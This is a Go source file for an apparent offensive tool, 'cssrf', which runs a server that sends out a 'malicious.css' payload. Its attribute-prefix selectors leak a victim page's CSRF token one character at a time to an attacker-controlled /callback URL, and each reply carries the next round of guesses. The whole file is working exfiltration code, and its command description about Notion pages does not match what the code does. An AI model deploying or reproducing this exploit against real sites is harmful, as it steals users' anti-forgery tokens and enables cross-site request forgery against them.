package main

import (
	"bytes"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"strings"

	"github.com/ariary/cssrf/pkg/cssrf"
	"github.com/spf13/cobra"
)

// const trialAndErrorTpl = `{{range $val := .}}
// input[name=csrf][value^={{$val}}] { background: url({{ .ExternalUrl}}/callback?token={{$val}}); }{{end}}
// `

const trialAndErrorTpl = `}}] { background: url({{ .ExternalUrl}}/callback?token=`

func main() {
	var config cssrf.Config
	config.Charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	//CMD ROOT
	var rootCmd = &cobra.Command{Use: "cssrf",
		Short: "only grab information from notion page. No HTTP ingoing traffic is used to work.",
		Args:  cobra.MinimumNArgs(0),
		Run: func(cmd *cobra.Command, args []string) {
			m := http.NewServeMux()
			s := http.Server{Addr: ":" + config.Port, Handler: m}

			//Init template
			initTemplate(&config)

			// define handlers
			m.Handle("/malicious.css", FirstLoad(&config))
			// m.Handle("/trialanderror", ActivateNotionTerm(config.Client, config.PageID, play))
			m.Handle("/callback", Callback(&config))
			fmt.Println("🐿️ Seeking data of lenght:", config.Length)
			fmt.Printf("🌳 Start server on localhost:%s (%s)\n", config.Port, config.ExternalUrl)
			if err := s.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Fatal(err)
			}
		}}

	// FLAGS
	rootCmd.PersistentFlags().StringVarP(&config.Port, "port", "p", "9292", "server listening port")
	rootCmd.PersistentFlags().StringVarP(&config.ExternalUrl, "url", "u", "localhost", "external reachable url of the server")
	rootCmd.PersistentFlags().IntVarP(&config.Length, "len", "l", 32, "data length to exfiltrate")
	rootCmd.Execute()
}

// const trialAndErrorTpl = `
// {{range $val := .}}
// input[name=csrf][value^={{$val}}] { background: url(toto/callback?token={{$val}}); }
// {{end}}
// `

//FirstLoad: target load malicious.css => begin trial and errors to retrieve data
func FirstLoad(cfg *cssrf.Config) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Println("🕹️ Load malicious.css")
		sendImports(w, cfg.Template, "", strings.Split(cfg.Charset, ""))
	})
}

//Callback: Call when css condition is met ~ data has been exfiltrated
func Callback(cfg *cssrf.Config) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		partialToken := r.URL.Query()["token"][0]
		if partialToken == "" {
			fmt.Println("failed to retrieve 'token' parameter")
		} else if len(partialToken) == cfg.Length {
			fmt.Println("🥜 Here is your nuts:", partialToken)
			w.Write([]byte("OK")) //answer anyway, don't be cocky
		} else {
			fmt.Println("🍁 retrieve data...", partialToken)
			//answer new imports
			sendImports(w, cfg.Template, partialToken, strings.Split(cfg.Charset, ""))
		}
	})
}

func initTemplate(cfg *cssrf.Config) {
	var tpl bytes.Buffer
	data := struct {
		ExternalUrl string
	}{
		ExternalUrl: cfg.ExternalUrl,
	}
	t := template.Must(template.New("trialAndError").Parse(`}}] { background: url({{ .ExternalUrl}}/callback?token=`))
	t.Execute(&tpl, data)
	cfg.Template = "{{range $val := .}}\ninput[name=csrf][value^={{$val" + tpl.String() + "{{$val}}); }{{end}}"
}

func craftImports(tpl string, prefix string, charset []string) (result string, err error) {
	var nCharset []string
	for i := 0; i < len(charset); i++ {
		nCharset = append(nCharset, prefix+charset[i])
	}
	var tplBytes bytes.Buffer
	data := struct {
		charset []string
	}{
		charset: nCharset,
	}

	t := template.Must(template.New("trialAndError").Parse(tpl))
	if err := t.Execute(&tplBytes, data.charset); err != nil {
		return "", err
	}
	result = tplBytes.String()
	return result, nil
}

func sendImports(w http.ResponseWriter, tpl string, prefix string, charset []string) {
	imports, err := craftImports(tpl, prefix, charset)
	if err != nil {
		fmt.Println("failed crafting imports:", err)
		w.Write([]byte("OK")) // answer anyway
	} else {
		w.Header().Add("content-type", "text/css")
		w.Write([]byte(imports))
	}
}
